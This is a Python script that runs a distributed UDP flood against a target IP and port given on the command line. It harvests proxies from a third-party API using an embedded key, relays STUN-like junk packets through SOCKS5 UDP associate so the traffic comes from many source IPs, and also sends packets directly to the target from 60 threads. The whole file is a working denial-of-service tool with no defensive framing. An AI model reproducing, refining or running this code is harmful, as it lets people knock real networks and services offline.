
import sys, time, json, socket, struct, threading, requests, os, re

TARGET_IP = sys.argv[1]
TARGET_PORT = int(sys.argv[2])
DURATION = int(sys.argv[3])
API_URL = "https://console.nextproxy.site/api/random?type=telegram&key=nex_live_44259ef41c87c9d2"

proxy_pool = set()

def extract_proxies(raw):
    found = []
    try:
        j = json.loads(raw)
        if isinstance(j, dict):
            # Support single proxy object or list inside data/proxies key
            if "ip" in j or "host" in j or "server" in j:
                h = j.get("ip") or j.get("host") or j.get("server")
                p = j.get("port")
                u = j.get("username") or j.get("user") or ""
                pw = j.get("password") or j.get("pass") or ""
                if h and p:
                    found.append((str(h), int(p), str(u), str(pw)))
            for k in ["data", "proxies", "result", "list"]:
                if isinstance(j.get(k), list):
                    for item in j[k]:
                        if isinstance(item, dict):
                            h = item.get("ip") or item.get("host") or item.get("server")
                            p = item.get("port")
                            u = item.get("username") or item.get("user") or ""
                            pw = item.get("password") or item.get("pass") or ""
                            if h and p:
                                found.append((str(h), int(p), str(u), str(pw)))
                        elif isinstance(item, str):
                            m = re.search(r'(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})', item)
                            if m:
                                found.append((m.group(1), int(m.group(2)), "", ""))
        elif isinstance(j, list):
            for item in j:
                if isinstance(item, str):
                    m = re.search(r'(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})', item)
                    if m:
                        found.append((m.group(1), int(m.group(2)), "", ""))
    except Exception:
        pass
    if not found:
        for m in re.finditer(r'(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})(?::([^\s:]+):([^\s:]+))?', raw):
            found.append((m.group(1), int(m.group(2)), m.group(3) or "", m.group(4) or ""))
    return found

# Harvest unique proxies from NextProxy endpoint (25 rapid pulls per runner)
for _ in range(25):
    try:
        r = requests.get(API_URL, timeout=2.5).text.strip()
        for px in extract_proxies(r):
            proxy_pool.add(px)
    except Exception:
        pass

proxy_list = list(proxy_pool)

def socks5_udp_relay_channel(px_tuple, end_time):
    px_ip, px_port, user, passwd = px_tuple
    try:
        tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_sock.settimeout(3.0)
        tcp_sock.connect((px_ip, int(px_port)))

        # Offer No-Auth (0x00) and User/Pass (0x02)
        if user and passwd:
            tcp_sock.sendall(b"\x05\x02\x00\x02")
        else:
            tcp_sock.sendall(b"\x05\x01\x00")
        method_resp = tcp_sock.recv(2)
        if len(method_resp) < 2 or method_resp[0] != 0x05:
            tcp_sock.close()
            return

        if method_resp[1] == 0x02:
            u_b = user.encode()
            p_b = passwd.encode()
            auth_pkt = b"\x01" + bytes([len(u_b)]) + u_b + bytes([len(p_b)]) + p_b
            tcp_sock.sendall(auth_pkt)
            auth_resp = tcp_sock.recv(2)
            if len(auth_resp) < 2 or auth_resp[1] != 0x00:
                tcp_sock.close()
                return
        elif method_resp[1] != 0x00:
            tcp_sock.close()
            return

        # Request UDP Associate (CMD 0x03)
        tcp_sock.sendall(b"\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00")
        resp = tcp_sock.recv(10)
        if len(resp) < 10 or resp[1] != 0x00:
            tcp_sock.close()
            return

        relay_ip = socket.inet_ntoa(resp[4:8])
        if relay_ip in ["0.0.0.0", "127.0.0.1"]:
            relay_ip = px_ip
        relay_port = struct.unpack("!H", resp[8:10])[0]

        dst_ip_bytes = socket.inet_aton(TARGET_IP)
        dst_port_bytes = struct.pack("!H", TARGET_PORT)
        socks_udp_hdr = b"\x00\x00\x00\x01" + dst_ip_bytes + dst_port_bytes

        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            stun_payload = b"\x00\x01\x00\x00\x21\x12\xa4\x42" + os.urandom(1100)
            full_gram = socks_udp_hdr + stun_payload
            for _ in range(80):
                udp_sock.sendto(full_gram, (relay_ip, relay_port))
        udp_sock.close()
        tcp_sock.close()
    except Exception:
        pass

def multi_ip_worker(worker_id):
    end_time = time.time() + DURATION
    udp_direct = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        # Each worker rotates across all harvested proxy IPs so 4-8+ proxy IPs flood simultaneously per runner
        if proxy_list:
            px = proxy_list[worker_id % len(proxy_list)]
            socks5_udp_relay_channel(px, min(end_time, time.time() + 10))
            worker_id += 1
        raw_pkt = b"\x00\x01\x00\x00\x21\x12\xa4\x42" + os.urandom(1100)
        for _ in range(120):
            try:
                udp_direct.sendto(raw_pkt, (TARGET_IP, TARGET_PORT))
            except Exception:
                pass

threads = [threading.Thread(target=multi_ip_worker, args=(i,)) for i in range(60)]
for t in threads: t.start()
for t in threads: t.join()
